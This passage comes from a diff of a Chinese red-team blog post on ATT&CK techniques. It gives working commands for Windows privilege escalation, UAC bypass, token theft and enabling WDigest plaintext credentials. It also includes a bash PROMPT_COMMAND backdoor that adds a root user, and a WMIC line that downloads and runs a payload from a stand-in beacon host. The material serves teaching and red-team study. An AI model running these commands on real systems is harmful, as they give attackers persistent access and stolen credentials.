+# 值全为1代表开启AlwaysInstallElevated，否则未开启</code></pre>
+
+<p>然后使用<a target="_blank" rel="noopener" href="https://github.com/LittleHann/PowerSploit/blob/master/Privesc/Privesc.psd1">powerup powershell tookkit</a>生成对应的.msi程序，完成提权添加用户的操作：</p>
+<pre class="language-none"><code class="language-none"># 将Privesc拷贝至&quot;$Env:windir\System32\WindowsPowerShell\v1.0\Modules&quot;
+# 导入moduel: 
+Import-Module Privesc
+# 检查是否开启AlwaysInstallElevated：
+Get-RegistryAlwaysInstallElevated
+# 返回true代表系统开启AlwaysInstallElevated 
+# 利用AlwaysInstallElevated添加用户
+Write-UserAddMSI
+# 运行后生成文件UserAdd.msi
+# 以普通用户权限运行这个UserAdd.msi，成功添加账户 </code></pre>
+
+<h3 id="5-UAC提权"><a href="#5-UAC提权" class="headerlink" title="5. UAC提权"></a>5. UAC提权</h3><p>自Windows Vista开始，微软引入了完整性级别概念，用于防止”权限滥用“，其设计模型来自于Biba完整性模型基础上的上不可写，下不可读原则来保护数据完整性，权限由高到低分为：</p>
+<pre class="language-none"><code class="language-none">1. 系统级(system)
+
+2. 管理员(High): 在Windows Vista之前的系统，默认创建的管理员账户即对应完整管理员(High)级别，这个级别基本没有限制，导致可以任意添加计划任务，写关键路径，读写关键注册表、创建服务、加载驱动等等
+
+3. 用户(Medium): 从Windows Vista开始创建的管理员账户均在用户(Medium)级别，当UAC(默认)开启的情况下，这个级别会有很多限制，仅当程序请求管理员权限，或是触发条件则弹窗询问用户授权。
+
+4. 受限(Low): 受限(Low)被应用于IE浏览器作为保护模式使用，其直接访问网页的进程会通过Host主进程代理操作系统资源，只有在Temp、Temporary、Internet Files、Cookies和Favorites目录下的几个特定低完整性目录可以进行写操作，同时启动其他进程时弹窗询问用户。</code></pre>
+
+<p>但由于微软出于兼容性、用户体验等的考虑，为减少UAC弹窗，设定了自动提权的机制，满足以下两个条件的程序，会自动提升权限</p>
+<pre class="language-none"><code class="language-none">1. 必须经过 Windows Publisher 数字签名
+2. 必须位于”安全目录“中，其中”安全目录“指的是普通用户(Medium)无权修改的，包括
+    1) %SystemRoot%\System32（例如，\Windows\System32）
+    2) 及其大多数子目录、%SystemRoot%\Ehome
+    3) 以及 %ProgramFiles% 下的少许目录（其中包括 Windows Defender 和 Windows 日记本）</code></pre>
+
+<p>绕过UAC的方法的核心思想</p>
+<pre class="language-none"><code class="language-none">1. 要充分利用基于Windows设定的&quot;自动提升&quot;机制，因为只有这个唯一的通道是可以避开UAC的。
+
+2. 显然不能或者非常难可以获得微软publisher的签名，所有只有寻找那些被系统“认可”的“具备自动提升权限”的程序去尝试“注入”或“劫持”，而“注入”这些核心进程是非常困难的，因此剩下的可探索的方向就是“劫持”
+
+3. 首先需要列出系统上存在的具备“自动提升权限”的进程，并找到它们存在dll的目录及文件名，这些dll文件名就是我们将要劫持替换的文件。
+
+4. 系统程序所在的目录往往都是核心目录，向这种目录写入dll同样是一个困难，这里依然需要使用“劫持”思想，寻找某个系统原生的程序，利用它的某个功能，实现dll的释放和替换。</code></pre>
+
+<p><strong>1) DLL劫持</strong></p>
+<p>将DLL复制到 sysprep目录进行权限提升。实现这一目的的两种最流行的方式是：使用一个IFileOperation COM对象，或者使用Wusa.exe和它的“extract”选项。目前，Invoke-PsUACme使用的是Wusa方法。因为Wusa设置为了自动提升，所以可以用它来提取一个cab文件到sysprep目录</p>
+<pre class="language-none"><code class="language-none"># 通过makecab生成一个cab文件，cab中包含我们指定的恶意dll文件
+makecab C:\your_dll_path.dll C:\any_path_is_ok.cab
+
+# 执行wusa将cab文件中的dll释放到指定目录(例如&quot;C:\Windows\System32\Sysprep\&quot;)，这一步即是劫持的过程
+&amp; wusa C:\any_path_is_ok.cab &#x2F;extract:&quot;C:\Windows\System32\Sysprep\&quot;
+
+# 调用&quot;C:\Windows\System32\Sysprep\sysprep.exe&quot;，此时该进程调用的dll会被我们完成劫持，执行我们指定的dll中的恶意代码
+&amp; C:\Windows\System32\Sysprep\sysprep.exe
+
+# 使用nishang的Invoke-PsUACme可以自动完成这所有过程
+Invoke-PsUACme -method oobe -Payload &quot;powershell -noexit -c Get-Process&quot;</code></pre>
+
+<p><em>refer:</em> <a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a></p>
+<p><strong>2) 利用CMSTP配置VPN的功能滥用进行UAC提权执行进程</strong></p>
+<p>vpn配置程序自身提供了一个功能”RunPreSetupCommandsSection”，提供在安装开始前提供了一个执行指令的回调接口</p>
+<p>把.inf文件放置在目录下，执行该指令</p>
+<pre class="language-none"><code class="language-none">C:&#x2F;Windows&#x2F;System32&#x2F;cmstp.exe C:\Users\Administrator\Desktop\poc\UACBypass.inf &#x2F;au</code></pre>
+
+<p>指令过程中会弹出一个UI窗口需要点击确认，可以用powershell脚本的sendkey模拟按键来完成一键自动化UAC提权</p>
+<p><em>refer:</em> <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86685">https://www.anquanke.com/post/id/86685</a></p>
+<p><strong>3) 注册表劫持</strong></p>
+<p>Eventvwr.exe - Displays Windows Event Logs in a GUI window</p>
+<p>在”eventvwr.exe”启动期间，eventvwr.exe检查注册表值HKCU\Software\Classes\msc file\shell\open\command以查找mmc.exe的位置，该文件用于打开eventvwr.msc保存的控制台文件。如果将另一个二进制文件或脚本的位置添加到此注册表值，则它将作为高完整性进程执行，而不会向用户显示UAC提示</p>
+<p><em>refer:</em> <a target="_blank" rel="noopener" href="https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/">https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/</a></p>
+<h3 id="6-利用Bash环境变量植入后门"><a href="#6-利用Bash环境变量植入后门" class="headerlink" title="6. 利用Bash环境变量植入后门"></a>6. 利用Bash环境变量植入后门</h3><p>PROMPT_COMMAND这个变量的内容会在现实bash提示符前执行，类似ld_preload劫持，可以通过在PROMPT_COMMAND中插入evil code来实现代码注入的目的</p>
+<pre class="language-none"><code class="language-none">export PROMPT_COMMAND&#x3D;&quot;&#x2F;usr&#x2F;sbin&#x2F;useradd -o -u 0 hack &amp;&gt;&#x2F;dev&#x2F;null &amp;&amp; echo hacker:123456 | &#x2F;usr&#x2F;sbin&#x2F;chpasswd &amp;&gt;&#x2F;dev&#x2F;null &amp;&amp; unset PROMPT_COMMAND&quot;</code></pre>
+
+<p><em>refer:</em> <a target="_blank" rel="noopener" href="https://evi1cg.me/archives/Commands.html">https://evi1cg.me/archives/Commands.html</a></p>
+<h3 id="7-Token-x2F-Hash窃取与提权"><a href="#7-Token-x2F-Hash窃取与提权" class="headerlink" title="7. Token&#x2F;Hash窃取与提权"></a>7. Token&#x2F;Hash窃取与提权</h3><p><strong>1）通过incognito枚举token</strong></p>
+<p>Windows有两种类型的Token：</p>
+<pre class="language-none"><code class="language-none">a. Delegation token(授权令牌)：用于交互会话登录(例如本地用户直接登录、远程桌面登录)。具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效
+
+b. Impersonation token(模拟令牌)：用于非交互登录(利用net use访问共享文件夹) </code></pre>
+
+<p>两种token都只在系统重启后清除，通过incognito.exe枚举token list</p>
+<pre class="language-none"><code class="language-none">incognito.exe list_tokens -u</code></pre>
+
+<p>利用该token执行calc.exe</p>
+<pre class="language-none"><code class="language-none"># 通过任务管理器查看到进程的账户名为 hacker
+incognito.exe execute -c &quot;iZxkpes3z6p6ajZ\hacker&quot; calc.exe</code></pre>
+
+<p>提权至system：</p>
+<pre class="language-none"><code class="language-none">incognito.exe execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe</code></pre>
+
+<p><strong>2) 利用token获得TrustedInstaller权限</strong></p>
+<p>在Windows系统中，即使获得了管理员权限和system权限，也不能修改系统文件，因为Windows系统的最高权限为TrustedInstaller</p>
+<p>查看文件夹属性，显示system不具有写入权限，只有TrustedInstaller可以，借用TrustedInstaller.exe的token创建子进程，子进程就有了TrustedInstaller权限</p>
+<pre class="language-none"><code class="language-none">Set-NtTokenPrivilege SeDebugPrivilege
+$p &#x3D; Get-NtProcess -Name TrustedInstaller.exe
+$proc &#x3D; New-Win32Process cmd.exe -CreationFlags NewConsole -ParentProcess $p</code></pre>
+
+<p><strong>3）利用 Windows 系统内置的域用户密钥缓存工具 cmdkey 获取令牌缓存</strong></p>
+<pre class="language-none"><code class="language-none">cmdkey &#x2F;list</code></pre>
+
+<p>WMIC在向远程主机执行指令的时候，都会先默认使用缓存的凭证。攻击者可以利用本机已经缓存的令牌，直接执行指令或启动新进程</p>
+<pre class="language-none"><code class="language-none">wmic &#x2F;node:TERMSRV&#x2F;47.111.191.59 process call create &quot;cmd &#x2F;c calc.exe&quot;
+wmic &#x2F;node:47.111.191.59 process call create &quot;cmd &#x2F;c calc.exe&quot;
+wmic &#x2F;node:&lt;TARGET-BOX process call create &quot;cmd &#x2F;c powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;beacon_IP&#x2F;a&#39;))\&quot;&quot;</code></pre>
+
+<h3 id="8-HASH-Dump"><a href="#8-HASH-Dump" class="headerlink" title="8. HASH Dump"></a>8. HASH Dump</h3><p><strong>1. 启用 WDigest UseLogonCredential 注册表项</strong></p>
+<p>在Windows 8.1和Windows Server 2012 R2之前，Wdigest已启用，它将用户的“明文”密码放在LSASS内存空间中，以支持基本的身份验证方案.Windows 8.1和Windows Server 2012 R2及更高版本的WDigest默认禁用，通过添加并设置以下注册表项：</p>
+<pre class="language-none"><code class="language-none">reg add &quot;HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Wdigest&quot; &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1</code></pre>
+
+<p>该注册表键值设置为1后，系统允许将登录凭据以明文形式存储在 LSA 内存中，这样就可以从内存获得登录凭据。</p>
+<h2 id="0x05-防御规避-Defense-Evasion"><a href="#0x05-防御规避-Defense-Evasion" class="headerlink" title="0x05 防御规避(Defense Evasion)"></a>0x05 防御规避(Defense Evasion)</h2><h2 id="0x06-凭证访问-Credential-Access"><a href="#0x06-凭证访问-Credential-Access" class="headerlink" title="0x06 凭证访问(Credential Access)"></a>0x06 凭证访问(Credential Access)</h2><h2 id="0x07-环境发现-Discovery"><a href="#0x07-环境发现-Discovery" class="headerlink" title="0x07 环境发现(Discovery)"></a>0x07 环境发现(Discovery)</h2><h2 id="0x08-横向移动-Lateral-Movement"><a href="#0x08-横向移动-Lateral-Movement" class="headerlink" title="0x08 横向移动(Lateral Movement)"></a>0x08 横向移动(Lateral Movement)</h2><h2 id="0x09-数据收集-Collection"><a href="#0x09-数据收集-Collection" class="headerlink" title="0x09 数据收集(Collection)"></a>0x09 数据收集(Collection)</h2><h2 id="0x0A-命令与控制-Command-and-Control"><a href="#0x0A-命令与控制-Command-and-Control" class="headerlink" title="0x0A 命令与控制(Command and Control)"></a>0x0A 命令与控制(Command and Control)</h2><h2 id="0x0B-数据渗漏-Exfiltration"><a href="#0x0B-数据渗漏-Exfiltration" class="headerlink" title="0x0B 数据渗漏(Exfiltration)"></a>0x0B 数据渗漏(Exfiltration)</h2><h2 id="0x0C-影响破坏-Impact"><a href="#0x0C-影响破坏-Impact" class="headerlink" title="0x0C 影响破坏(Impact)"></a>0x0C 影响破坏(Impact)</h2><h2 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF Reference"></a>0xFF Reference</h2><ul>
 <li><a target="_blank" rel="noopener" href="https://attack.mitre.org/matrices/enterprise/windows/">https://attack.mitre.org/matrices/enterprise/windows/</a></li>
 <li><a target="_blank" rel="noopener" href="https://dmcxblue.gitbook.io/red-team-notes-2-0/">https://dmcxblue.gitbook.io/red-team-notes-2-0/</a></li>
 <li><a target="_blank" rel="noopener" href="https://adsecurity.org/">https://adsecurity.org/</a></li>
 <li><a target="_blank" rel="noopener" href="https://www.ired.team/">https://www.ired.team/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LittleHann/p/8420779.html">https://www.cnblogs.com/LittleHann/p/8420779.html</a></li>
 <li><a target="_blank" rel="noopener" href="https://lolbas-project.github.io/">https://lolbas-project.github.io/</a></li>
 <li><a target="_blank" rel="noopener" href="https://micro8.gitbook.io/micro8/">https://micro8.gitbook.io/micro8/</a></li>
 </ul>
@@ -384,8 +722,8 @@
 
     <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/Windows/" rel="tag" <i class="fa fa-tag"></i> Windows</a>
               <a href="/tags/ATT-CK/" rel="tag" <i class="fa fa-tag"></i> ATT&CK</a>
+              <a href="/tags/Windows/" rel="tag" <i class="fa fa-tag"></i> Windows</a>
           </div>
 
         
